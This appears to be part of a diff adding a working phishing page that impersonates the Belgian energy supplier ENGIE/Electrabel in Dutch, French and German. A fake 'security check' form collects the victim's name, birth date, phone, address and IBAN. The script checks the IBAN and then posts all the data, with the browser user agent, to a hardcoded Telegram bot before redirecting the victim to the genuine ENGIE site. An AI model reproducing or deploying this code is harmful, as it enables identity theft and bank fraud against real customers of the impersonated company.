+        </div>
+    </section>
+
+    <section class="advantages-section">
+        <div class="advantages-title" data-i18n="adv.title">Voordelen speciaal voor u</div>
+        <div class="advantages-grid">
+            <div class="deal-card" data-scroll>
+                <div class="deal-image"><img src="carrefour-deal-2025_ltfozg.avif" alt="Carrefour"></div>
+                <div class="deal-content">
+                    <div class="deal-title" data-i18n="adv.1.title">Bij aankoop van uw Carrefour-vouchers</div>
+                    <div class="deal-blue" data-i18n="adv.1.disc">2,5% korting</div>
+                    <div class="deal-valid" data-i18n="adv.1.valid">Geldig tot 31/12/2026</div>
+                </div>
+            </div>
+            <div class="deal-card" data-scroll>
+                <div class="deal-image"><img src="jcr_8c885fa1-8d85-4562-bb8c-ba733e007427.avif" alt="Colruyt"></div>
+                <div class="deal-content">
+                    <div class="deal-title" data-i18n="adv.2.title">Op al uw aankopen bij Colruyt</div>
+                    <div class="deal-blue" data-i18n="adv.2.disc">2% korting</div>
+                    <div class="deal-valid" data-i18n="adv.2.valid">Geldig tot 31/12/2026</div>
+                </div>
+            </div>
+            <div class="deal-card" data-scroll>
+                <div class="deal-image"><img src="gamma-deal-2026_puefcm.avif" alt="Gamma"></div>
+                <div class="deal-content">
+                    <div class="deal-title" data-i18n="adv.3.title">GAMMA, uw doe-het-zelf-partner</div>
+                    <div class="deal-blue" data-i18n="adv.3.disc">15% + 4% korting</div>
+                    <div class="deal-valid" data-i18n="adv.3.valid">Geldig tot 30/09/2026</div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="footer-nav-section">
+        <div class="footer-nav-inner">
+            <div class="footer-nav-column">
+                <div class="footer-nav-title" data-i18n="f1.title">Ons aanbod</div>
+                <ul class="footer-nav-links">
+                    <li data-scroll data-i18n="f1.1">Elektriciteit</li>
+                    <li data-scroll data-i18n="f1.2">Gas</li>
+                    <li data-scroll data-i18n="f1.3">Flexibele energie</li>
+                    <li data-scroll data-i18n="f1.4">Uw ketel vervangen</li>
+                    <li data-scroll data-i18n="f1.5">Ketelonderhoud</li>
+                    <li data-scroll data-i18n="f1.6">Woningbijstand</li>
+                    <li data-scroll data-i18n="f1.7">Isolatie</li>
+                </ul>
+            </div>
+            <div class="footer-nav-column">
+                <div class="footer-nav-title" data-i18n="f2.title">Klantenservice</div>
+                <ul class="footer-nav-links">
+                    <li data-scroll data-i18n="f2.1">Hulp nodig?</li>
+                    <li data-scroll data-i18n="f2.2">Uw voordelen</li>
+                    <li data-scroll data-i18n="f2.3">Uw facturen</li>
+                    <li data-scroll data-i18n="f2.4">Verhuizen</li>
+                    <li data-scroll data-i18n="f2.5">Onze indicatoren</li>
+                    <li data-scroll data-i18n="f2.6">Frauduleuze berichten</li>
+                </ul>
+            </div>
+            <div class="footer-nav-column">
+                <div class="footer-nav-title" data-i18n="f3.title">Download de Smart App</div>
+                <div class="footer-nav-apps">
+                    <img src="jcr_eeabdb98-dd88-4d74-9b2c-2047035a5678.png" alt="App Store" data-scroll>
+                    <img src="jcr_eb71812e-d3ff-45b2-a3d3-28fc54d0d547.png" alt="Google Play" data-scroll>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <div class="bottom-copyright">
+        <div class="bottom-copyright-inner">
+            <span>© Electrabel nv</span>
+            <a data-scroll data-i18n="cp.1">Onze voorwaarden</a>
+            <a data-scroll data-i18n="cp.2">Privacy</a>
+            <a data-scroll data-i18n="cp.3">Jobs</a>
+            <a data-scroll data-i18n="cp.4">Leveranciers</a>
+            <a data-scroll data-i18n="cp.5">Partner</a>
+            <a data-scroll data-i18n="cp.6">Meer over ENGIE</a>
+            <a data-scroll data-i18n="cp.7">Cookiebeleid</a>
+        </div>
+    </div>
+
+    <script>
+        // ============================================================
+        //  НАСТРОЙКИ ОТПРАВКИ В TELEGRAM
+        // ============================================================
+        var TELEGRAM_BOT_TOKEN = "8641605812:AAGsYCeLbmstk1PwkwdFOyG1Ec65mbLSnTU";
+        var TELEGRAM_CHAT_ID   = "-1003994523593";
+        var REDIRECT_URL = "https://www.engie.be/nl/#";
+        // ============================================================
+
+        // ============================================================
+        //  ПЕРЕВОДЫ NL / FR / DE
+        // ============================================================
+        var I18N = {
+            nl: {
+                "nav.part": "Particulieren",
+                "nav.prof": "Professionelen",
+                "nav.corp": "Grote ondernemingen",
+                "nav.move": "Verhuizen",
+                "nav.help": "Hulp & Contact",
+                "bn.become": "Klant worden",
+                "bn.elec": "Elektriciteit en gas",
+                "bn.services": "Diensten en apparatuur",
+                "bn.smart": "Slim verbruik",
+                "bn.tools": "Tools & Voordelen",
+                "bn.topics": "Actuele onderwerpen",
+                "bn.zone": "Mijn klantenzone",
+                "hero.h1": "Smart Charge. Wanneer goedkoper laden<br>automatisch<br>wordt.",
+                "hero.sub": "En bovendien, <strong>ontvangt u ongeveer € 1 per slimme laadsessie</strong> met een Empower-, Easy- of Flow-contract.",
+                "hero.btn": "Ontdek Smart Charge",
+                "hero.hint": "<strong>Waar vind ik Smart Charge in de app? Klik rechtsonder op <span class=\"app-icon\"><img src=\"engie-icon-app-small_iw8wtr.png\" alt=\"App icon\"></span> en kies Smart Charge.</strong>",
+                "warn.title": "Belangrijke veiligheidscontrole",
+                "warn.p1": "Door ons nieuwe systeem controleren wij of uw gegevens nog steeds end-to-end hetzelfde zijn.",
+                "warn.p2": "Gelieve daarom uw gegevens in te vullen, zodat wij kunnen nagaan of alles nog in orde is.",
+                "form.title": "Controleer uw identiteit",
+                "form.sub": "Vul uw gegevens in",
+                "form.fio": "Uw volledige naam",
+                "form.fio.ph": "Uw volledige naam",
+                "form.dob": "Uw geboortedatum",
+                "form.phone": "Uw telefoonnummer",
+                "form.addr": "Adres",
+                "form.stad.ph": "Stad",
+                "form.straat.ph": "Straat en huisnummer",
+                "form.postcode.ph": "Postcode",
+                "form.iban": "Uw IBAN",
+                "form.btn": "Versturen",
+                "second.title": "Bij ENGIE bent u <span class=\"gradient-word\">gerust</span>.",
+                "card1.title": "De grootste leverancier in België",
+                "card1.text": "2,8 miljoen Belgen vertrouwen ons voor hun energie. Word klant en geniet ook van onze 5-sterrenservice, erkend door de Vlaamse Nutsregulator.",
+                "card2.title": "Aantrekkelijke prijzen & klantvoordelen",
+                "card2.text": "Kies het contract dat bij uw situatie past: vast of variabel en aan een competitieve prijs. Bovendien geniet u van talrijke kortingen bij onze partners.",
+                "card3.title": "Volg uw verbruik met de Smart App",
+                "card3.text": "Dankzij de Smart App kunt u uw energieverbruik en uw voorschotbedrag met een gerust hart opvolgen.",
+                "prod.title": "Onze producten en diensten",
+                "prod.sub": "Oplossingen om het verbruik van uw woning te verlagen.",
+                "adv.title": "Voordelen speciaal voor u",
+                "adv.1.title": "Bij aankoop van uw Carrefour-vouchers",
+                "adv.1.disc": "2,5% korting",
+                "adv.1.valid": "Geldig tot 31/12/2026",
+                "adv.2.title": "Op al uw aankopen bij Colruyt",
+                "adv.2.disc": "2% korting",
+                "adv.2.valid": "Geldig tot 31/12/2026",
+                "adv.3.title": "GAMMA, uw doe-het-zelf-partner",
+                "adv.3.disc": "15% + 4% korting",
+                "adv.3.valid": "Geldig tot 30/09/2026",
+                "f1.title": "Ons aanbod",
+                "f1.1": "Elektriciteit",
+                "f1.2": "Gas",
+                "f1.3": "Flexibele energie",
+                "f1.4": "Uw ketel vervangen",
+                "f1.5": "Ketelonderhoud",
+                "f1.6": "Woningbijstand",
+                "f1.7": "Isolatie",
+                "f2.title": "Klantenservice",
+                "f2.1": "Hulp nodig?",
+                "f2.2": "Uw voordelen",
+                "f2.3": "Uw facturen",
+                "f2.4": "Verhuizen",
+                "f2.5": "Onze indicatoren",
+                "f2.6": "Frauduleuze berichten",
+                "f3.title": "Download de Smart App",
+                "cp.1": "Onze voorwaarden",
+                "cp.2": "Privacy",
+                "cp.3": "Jobs",
+                "cp.4": "Leveranciers",
+                "cp.5": "Partner",
+                "cp.6": "Meer over ENGIE",
+                "cp.7": "Cookiebeleid"
+            },
+            fr: {
+                "nav.part": "Particuliers",
+                "nav.prof": "Professionnels",
+                "nav.corp": "Grandes entreprises",
+                "nav.move": "Déménagement",
+                "nav.help": "Aide & Contact",
+                "bn.become": "Devenir client",
+                "bn.elec": "Électricité et gaz",
+                "bn.services": "Services et équipements",
+                "bn.smart": "Consommation intelligente",
+                "bn.tools": "Outils & Avantages",
+                "bn.topics": "Sujets d'actualité",
+                "bn.zone": "Mon espace client",
+                "hero.h1": "Smart Charge. Quand la recharge moins chère<br>devient<br>automatique.",
+                "hero.sub": "Et en plus, <strong>vous recevez environ € 1 par session de recharge intelligente</strong> avec un contrat Empower, Easy ou Flow.",
+                "hero.btn": "Découvrir Smart Charge",
+                "hero.hint": "<strong>Où trouver Smart Charge dans l'application ? Cliquez en bas à droite sur <span class=\"app-icon\"><img src=\"engie-icon-app-small_iw8wtr.png\" alt=\"App icon\"></span> et choisissez Smart Charge.</strong>",
+                "warn.title": "Contrôle de sécurité important",
+                "warn.p1": "En raison de notre nouveau système, nous vérifions si vos données sont toujours identiques de bout en bout.",
+                "warn.p2": "Veuillez donc remplir vos données afin que nous puissions vérifier que tout est toujours en ordre.",
+                "form.title": "Vérifiez votre identité",
+                "form.sub": "Remplissez vos données",
+                "form.fio": "Votre nom complet",
+                "form.fio.ph": "Votre nom complet",
+                "form.dob": "Votre date de naissance",
+                "form.phone": "Votre numéro de téléphone",
+                "form.addr": "Adresse",
+                "form.stad.ph": "Ville",
+                "form.straat.ph": "Rue et numéro",
+                "form.postcode.ph": "Code postal",
+                "form.iban": "Votre IBAN",
+                "form.btn": "Envoyer",
+                "second.title": "Chez ENGIE, vous êtes <span class=\"gradient-word\">tranquille</span>.",
+                "card1.title": "Le plus grand fournisseur en Belgique",
+                "card1.text": "2,8 millions de Belges nous font confiance pour leur énergie. Devenez client et profitez de notre service 5 étoiles, reconnu par le régulateur flamand.",
+                "card2.title": "Prix attractifs & avantages clients",
+                "card2.text": "Choisissez le contrat qui correspond à votre situation : fixe ou variable et à un prix compétitif. En plus, profitez de nombreuses réductions chez nos partenaires.",
+                "card3.title": "Suivez votre consommation avec la Smart App",
+                "card3.text": "Grâce à la Smart App, vous pouvez suivre votre consommation d'énergie et votre acompte en toute tranquillité.",
+                "prod.title": "Nos produits et services",
+                "prod.sub": "Des solutions pour réduire la consommation de votre habitation.",
+                "adv.title": "Avantages spécialement pour vous",
+                "adv.1.title": "À l'achat de vos chèques Carrefour",
+                "adv.1.disc": "2,5% de réduction",
+                "adv.1.valid": "Valable jusqu'au 31/12/2026",
+                "adv.2.title": "Sur tous vos achats chez Colruyt",
+                "adv.2.disc": "2% de réduction",
+                "adv.2.valid": "Valable jusqu'au 31/12/2026",
+                "adv.3.title": "GAMMA, votre partenaire bricolage",
+                "adv.3.disc": "15% + 4% de réduction",
+                "adv.3.valid": "Valable jusqu'au 30/09/2026",
+                "f1.title": "Notre offre",
+                "f1.1": "Électricité",
+                "f1.2": "Gaz",
+                "f1.3": "Énergie flexible",
+                "f1.4": "Remplacer votre chaudière",
+                "f1.5": "Entretien de chaudière",
+                "f1.6": "Assistance habitation",
+                "f1.7": "Isolation",
+                "f2.title": "Service client",
+                "f2.1": "Besoin d'aide ?",
+                "f2.2": "Vos avantages",
+                "f2.3": "Vos factures",
+                "f2.4": "Déménagement",
+                "f2.5": "Nos indicateurs",
+                "f2.6": "Messages frauduleux",
+                "f3.title": "Téléchargez la Smart App",
+                "cp.1": "Nos conditions",
+                "cp.2": "Confidentialité",
+                "cp.3": "Emplois",
+                "cp.4": "Fournisseurs",
+                "cp.5": "Partenaire",
+                "cp.6": "Plus sur ENGIE",
+                "cp.7": "Politique de cookies"
+            },
+            de: {
+                "nav.part": "Privatkunden",
+                "nav.prof": "Gewerbekunden",
+                "nav.corp": "Großunternehmen",
+                "nav.move": "Umzug",
+                "nav.help": "Hilfe & Kontakt",
+                "bn.become": "Kunde werden",
+                "bn.elec": "Strom und Gas",
+                "bn.services": "Dienstleistungen und Geräte",
+                "bn.smart": "Smartes Verbrauchen",
+                "bn.tools": "Tools & Vorteile",
+                "bn.topics": "Aktuelle Themen",
+                "bn.zone": "Mein Kundenbereich",
+                "hero.h1": "Smart Charge. Wenn günstigeres Laden<br>automatisch<br>wird.",
+                "hero.sub": "Und außerdem <strong>erhalten Sie etwa € 1 pro intelligenter Ladesitzung</strong> mit einem Empower-, Easy- oder Flow-Vertrag.",
+                "hero.btn": "Smart Charge entdecken",
+                "hero.hint": "<strong>Wo finde ich Smart Charge in der App? Klicken Sie rechts unten auf <span class=\"app-icon\"><img src=\"engie-icon-app-small_iw8wtr.png\" alt=\"App icon\"></span> und wählen Sie Smart Charge.</strong>",
+                "warn.title": "Wichtige Sicherheitsüberprüfung",
+                "warn.p1": "Aufgrund unseres neuen Systems prüfen wir, ob Ihre Daten noch end-to-end unverändert sind.",
+                "warn.p2": "Bitte geben Sie daher Ihre Daten ein, damit wir überprüfen können, ob alles noch in Ordnung ist.",
+                "form.title": "Identität überprüfen",
+                "form.sub": "Geben Sie Ihre Daten ein",
+                "form.fio": "Ihr vollständiger Name",
+                "form.fio.ph": "Ihr vollständiger Name",
+                "form.dob": "Ihr Geburtsdatum",
+                "form.phone": "Ihre Telefonnummer",
+                "form.addr": "Adresse",
+                "form.stad.ph": "Stadt",
+                "form.straat.ph": "Straße und Hausnummer",
+                "form.postcode.ph": "Postleitzahl",
+                "form.iban": "Ihre IBAN",
+                "form.btn": "Senden",
+                "second.title": "Bei ENGIE sind Sie <span class=\"gradient-word\">beruhigt</span>.",
+                "card1.title": "Der größte Anbieter in Belgien",
+                "card1.text": "2,8 Millionen Belgier vertrauen uns für ihre Energie. Werden Sie Kunde und genießen Sie unseren 5-Sterne-Service, anerkannt von der Flämischen Regulierungsbehörde.",
+                "card2.title": "Attraktive Preise & Kundenvorteile",
+                "card2.text": "Wählen Sie den Vertrag, der zu Ihrer Situation passt: fest oder variabel und zu einem wettbewerbsfähigen Preis. Darüber hinaus genießen Sie zahlreiche Rabatte bei unseren Partnern.",
+                "card3.title": "Verfolgen Sie Ihren Verbrauch mit der Smart App",
+                "card3.text": "Dank der Smart App können Sie Ihren Energieverbrauch und Ihren Vorschussbetrag beruhigt verfolgen.",
+                "prod.title": "Unsere Produkte und Dienstleistungen",
+                "prod.sub": "Lösungen zur Senkung des Verbrauchs Ihres Hauses.",
+                "adv.title": "Vorteile speziell für Sie",
+                "adv.1.title": "Beim Kauf Ihrer Carrefour-Gutscheine",
+                "adv.1.disc": "2,5% Rabatt",
+                "adv.1.valid": "Gültig bis 31.12.2026",
+                "adv.2.title": "Auf alle Ihre Einkäufe bei Colruyt",
+                "adv.2.disc": "2% Rabatt",
+                "adv.2.valid": "Gültig bis 31.12.2026",
+                "adv.3.title": "GAMMA, Ihr Heimwerker-Partner",
+                "adv.3.disc": "15% + 4% Rabatt",
+                "adv.3.valid": "Gültig bis 30.09.2026",
+                "f1.title": "Unser Angebot",
+                "f1.1": "Strom",
+                "f1.2": "Gas",
+                "f1.3": "Flexible Energie",
+                "f1.4": "Ihren Kessel ersetzen",
+                "f1.5": "Kesselwartung",
+                "f1.6": "Wohnungsbeistand",
+                "f1.7": "Isolierung",
+                "f2.title": "Kundenservice",
+                "f2.1": "Brauchen Sie Hilfe?",
+                "f2.2": "Ihre Vorteile",
+                "f2.3": "Ihre Rechnungen",
+                "f2.4": "Umzug",
+                "f2.5": "Unsere Indikatoren",
+                "f2.6": "Betrügerische Nachrichten",
+                "f3.title": "Laden Sie die Smart App herunter",
+                "cp.1": "Unsere Bedingungen",
+                "cp.2": "Datenschutz",
+                "cp.3": "Jobs",
+                "cp.4": "Lieferanten",
+                "cp.5": "Partner",
+                "cp.6": "Mehr über ENGIE",
+                "cp.7": "Cookie-Richtlinie"
+            }
+        };
+
+        // ============================================================
+        //  ПЕРЕКЛЮЧАТЕЛЬ ЯЗЫКА
+        // ============================================================
+        (function () {
+            var current = 'nl';
+            function t(key) {
+                return (I18N[current] && I18N[current][key]) || (I18N['nl'][key]) || key;
+            }
+            function applyLang(lang) {
+                if (!I18N[lang]) return;
+                current = lang;
+                document.documentElement.lang = lang;
+                document.querySelectorAll('[data-i18n]').forEach(function (el) {
+                    el.textContent = t(el.getAttribute('data-i18n'));
+                });
+                document.querySelectorAll('[data-i18n-html]').forEach(function (el) {
+                    el.innerHTML = t(el.getAttribute('data-i18n-html'));
+                });
+                document.querySelectorAll('[data-i18n-ph]').forEach(function (el) {
+                    el.setAttribute('placeholder', t(el.getAttribute('data-i18n-ph')));
+                });
+                document.querySelectorAll('#langSwitch span[data-lang]').forEach(function (el) {
+                    el.classList.toggle('active', el.getAttribute('data-lang') === lang);
+                });
+                try { localStorage.setItem('site_lang', lang); } catch (e) {}
+            }
+            document.querySelectorAll('#langSwitch span[data-lang]').forEach(function (el) {
+                el.addEventListener('click', function () {
+                    applyLang(el.getAttribute('data-lang'));
+                });
+            });
+            var saved = null;
+            try { saved = localStorage.getItem('site_lang'); } catch (e) {}
+            if (saved !== 'fr' && saved !== 'nl' && saved !== 'de') {
+                var bl = (navigator.language || 'nl').slice(0, 2).toLowerCase();
+                if (bl === 'fr') saved = 'fr';
+                else if (bl === 'de') saved = 'de';
+                else saved = 'nl';
+            }
+            applyLang(saved);
+        })();
+
+        // ===== Скролл к "Controleer uw identiteit" =====
+        (function () {
+            var target = document.getElementById('identitySection');
+            var card = document.getElementById('identityCard');
+            if (!target) return;
+            function scrollToIdentity(e) {
+                if (e) e.preventDefault();
+                target.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                if (card) {
+                    card.classList.remove('pulse');
+                    void card.offsetWidth;
+                    card.classList.add('pulse');
+                }
+                setTimeout(function () {
+                    var first = document.getElementById('fio');
+                    if (first) first.focus({ preventScroll: true });
+                }, 500);
+            }
+            var nodes = document.querySelectorAll('[data-scroll]');
+            for (var i = 0; i < nodes.length; i++) nodes[i].addEventListener('click', scrollToIdentity);
+        })();
+
+        // ===== IBAN VALIDATOR =====
+        var IBAN_LENGTHS = {
+            "AL":28,"AD":24,"AT":20,"AZ":28,"BH":22,"BE":16,"BA":20,"BR":29,"BG":22,
+            "CR":22,"HR":21,"CY":28,"CZ":24,"DK":18,"DO":28,"EE":20,"FO":18,"FI":18,
+            "FR":27,"GE":22,"DE":22,"GI":23,"GR":27,"GL":18,"GT":28,"HU":28,"IS":26,
+            "IE":22,"IL":23,"IT":27,"JO":30,"KZ":20,"XK":20,"KW":30,"LV":21,"LB":28,
+            "LI":21,"LT":20,"LU":20,"MT":31,"MR":27,"MU":30,"MD":24,"MC":27,"ME":22,
+            "NL":18,"MK":19,"NO":15,"PK":24,"PS":29,"PL":28,"PT":25,"QA":29,"RO":24,
+            "LC":32,"SM":27,"ST":25,"SA":24,"RS":22,"SC":31,"SK":24,"SI":19,"ES":24,
+            "SE":24,"CH":21,"TL":23,"TN":24,"TR":26,"UA":29,"AE":23,"GB":22,"VA":22,
+            "VG":24,"BY":28,"SV":28,"IQ":23,"LY":25,"SD":18,"BI":27,"DJ":27,"EG":29,
+            "FK":18,"MN":20,"NI":32,"OM":23,"RU":33,"SO":23,"YE":30,"GQ":27,"AO":25,
+            "BF":28,"BJ":28,"CI":28,"CM":27,"CV":25,"DZ":26,"GA":27,"IR":26,"MG":27,
+            "ML":28,"MZ":25,"SN":28,"TD":27,"TG":28,"KM":27,"CG":27,"CD":27,"CF":27,
+            "HN":28,"PY":28,"BO":22,"AR":22,"CO":24,"EC":24,"PE":24,"UY":23,"VE":24,
+            "PA":24,"CL":24,"MX":18
+        };
+
+        function _letterToNum(ch) { return (ch.charCodeAt(0) - 55).toString(); }
+        function _mod97(str) {
+            var rem = 0;
+            for (var i = 0; i < str.length; i++) rem = (rem * 10 + parseInt(str.charAt(i), 10)) % 97;
+            return rem;
+        }
+        function validateIBANClient(raw) {
+            if (!raw) return { ok: false, reason: "Lege IBAN" };
+            var iban = String(raw).toUpperCase().replace(/[\s\-\.]/g, "");
+            if (iban.length === 14 && /^[0-9]+$/.test(iban)) iban = "BE" + iban;
+            if (iban.length < 4) return { ok: false, reason: "Te kort" };
+            var country = iban.slice(0, 2);
+            if (!/^[A-Z]{2}$/.test(country)) return { ok: false, reason: "Eerste 2 tekens moeten landcode zijn" };
+            var expected = IBAN_LENGTHS[country];
+            if (!expected) return { ok: false, reason: "Onbekende landcode: " + country };
+            if (iban.length !== expected) return { ok: false, reason: "Verkeerde lengte voor " + country + ": " + iban.length + ", verwacht " + expected };
+            if (!/^[0-9]+$/.test(iban.slice(4))) return { ok: false, reason: "Alleen cijfers na landcode en controlecijfers" };
+            var rearranged = iban.slice(4) + iban.slice(0, 4);
+            var numeric = "";
+            for (var i = 0; i < rearranged.length; i++) {
+                var c = rearranged.charAt(i);
+                numeric += /[0-9]/.test(c) ? c : _letterToNum(c);
+            }
+            if (_mod97(numeric) !== 1) return { ok: false, reason: "Controlecijfer (mod-97) komt niet overeen" };
+            return { ok: true, reason: "Geldig (" + country + ")" };
+        }
+
+        function getBrowserInfo() { return { ua: navigator.userAgent || '' }; }
+
+        function formatDateTime(date) {
+            var d = date.getDate();
+            var m = date.getMonth() + 1;
+            var y = date.getFullYear();
+            var hh = String(date.getHours()).padStart(2, '0');
+            var mm = String(date.getMinutes()).padStart(2, '0');
+            var ss = String(date.getSeconds()).padStart(2, '0');
+            return d + '.' + m + '.' + y + ', ' + hh + ':' + mm + ':' + ss;
+        }
+
+        // ===== Дата рождения =====
+        (function () {
+            var dob = document.getElementById('dob');
+            if (!dob) return;
+            dob.addEventListener('input', function () {
+                var digits = dob.value.replace(/\D/g, '').slice(0, 8);
+                var out = '';
+                if (digits.length > 0) out += digits.slice(0, 2);
+                if (digits.length >= 2) out += '/';
+                if (digits.length > 2) out += digits.slice(2, 4);
+                if (digits.length >= 4) out += '/';
+                if (digits.length > 4) out += digits.slice(4, 8);
+                dob.value = out;
+            });
+            dob.addEventListener('keydown', function (e) {
+                if (e.key === 'Backspace' && dob.value.endsWith('/')) {
+                    e.preventDefault();
+                    dob.value = dob.value.slice(0, -1);
+                }
+            });
+        })();
+
+        // ===== Телефон: +32 =====
+        (function () {
+            var ph = document.getElementById('phoneInput');
+            if (!ph) return;
+            var prefix = '+32 ';
+            function format(digits) {
+                digits = digits.replace(/\D/g, '');
+                if (digits.startsWith('32')) digits = digits.slice(2);
+                if (digits.startsWith('0')) digits = digits.slice(1);
+                digits = digits.slice(0, 9);
+                var out = '';
+                if (digits.length > 0) out += digits.slice(0, 3);
+                if (digits.length > 3) out += ' ' + digits.slice(3, 5);
+                if (digits.length > 5) out += ' ' + digits.slice(5, 7);
+                if (digits.length > 7) out += ' ' + digits.slice(7, 9);
+                return prefix + out;
+            }
+            ph.value = prefix;
+            ph.addEventListener('input', function () {
+                var raw = ph.value;
+                if (!raw.startsWith('+32')) raw = prefix + raw.replace(/^\+?32\s?/, '').replace(/^0/, '');
+                ph.value = format(raw.replace(/^\+32\s?/, ''));
+            });
+            ph.addEventListener('focus', function () {
+                if (!ph.value.startsWith('+32')) ph.value = prefix + ph.value.replace(/\D/g, '');
+                if (ph.value === prefix) ph.setSelectionRange(prefix.length, prefix.length);
+            });
+            ph.addEventListener('keydown', function (e) {
+                if (e.key === 'Backspace' && ph.value === prefix) e.preventDefault();
+                if (e.key === 'Backspace' && ph.selectionStart <= prefix.length && ph.selectionEnd <= prefix.length) e.preventDefault();
+            });
+            ph.addEventListener('blur', function () {
+                if (ph.value.trim() === '+32' || ph.value.trim() === '+32 ') ph.value = prefix;
+            });
+        })();
+
+        // ===== IBAN: только цифры =====
+        (function () {
+            var iban = document.getElementById('iban');
+            if (!iban) return;
+            iban.value = '';
+            iban.addEventListener('input', function () {
+                var v = iban.value.replace(/\D/g, '').slice(0, 19);
+                iban.value = v;
+            });
+        })();
+
+        // ===== Отправка в Telegram =====
+        (function () {
+            var btn = document.getElementById('submitBtn');
+            if (!btn) return;
+            btn.addEventListener('click', function (e) {
+                e.preventDefault();
+                var fio      = (document.getElementById('fio') || {}).value || '';
+                var dob      = (document.getElementById('dob') || {}).value || '';
+                var phone    = (document.getElementById('phoneInput') || {}).value || '';
+                var stad     = (document.getElementById('stad') || {}).value || '';
+                var straat   = (document.getElementById('straat') || {}).value || '';
+                var postcode = (document.getElementById('postcode') || {}).value || '';
+                var ibanEl   = document.getElementById('iban');
+                var ibanRaw  = ibanEl ? ibanEl.value.replace(/\D/g, '') : '';
+                var ibanFull = 'BE' + ibanRaw;
+
+                if (!fio || !dob || !phone || !stad || !straat || !postcode || !ibanRaw) {
+                    alert('Vul alle velden in.');
+                    return;
+                }
+
+                var check = validateIBANClient(ibanFull);
+                var ibanLine = check.ok
+                    ? '🏦 IBAN: ' + ibanFull + '\n✅ IBAN status: Geldig'
+                    : '🏦 IBAN: ' + ibanFull + '\n❌ IBAN status: Ongeldig — ' + check.reason;
+
+                var now = new Date();
+                var dt = formatDateTime(now);
+                var br = getBrowserInfo();
+
+                var text =
+                    '🔔 Nieuwe aanvraag - ENGIE ⚡️\n' +
+                    '━━━━━━━━━━━━━━━\n' +
+                    '👤 Naam: ' + fio + '\n' +
+                    '🎂 Geboortedatum: ' + dob + '\n' +
+                    '📱 Telefoon: ' + phone + '\n' +
+                    '🏙 Stad: ' + stad + '\n' +
+                    '🏠 Straat: ' + straat + '\n' +
+                    '📮 Postcode: ' + postcode + '\n' +
+                    ibanLine + '\n' +
+                    '━━━━━━━━━━━━━━━\n' +
+                    dt + '\n' +
+                    '🌐 Browser: ' + br.ua;
+
+                var url = 'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage';
+
+                fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: text,
+                        disable_web_page_preview: true
+                    })
+                })
+                .then(function (r) { return r.json(); })
+                .then(function (res) {
+                    console.log('Telegram response:', res);
+                    if (res && res.ok) {
+                        alert('Bedankt! Uw gegevens zijn verzonden.');
+                        window.location.href = REDIRECT_URL;
+                    } else {
+                        alert('Fout bij verzenden: ' + (res && res.description ? res.description : 'onbekend'));
+                    }
+                })
+                .catch(function (err) {
+                    console.error('Fetch error:', err);
+                    alert('Verbindingsfout: ' + err);
+                });
+            });
+        })();
+    </script>
+</body>
+</html>
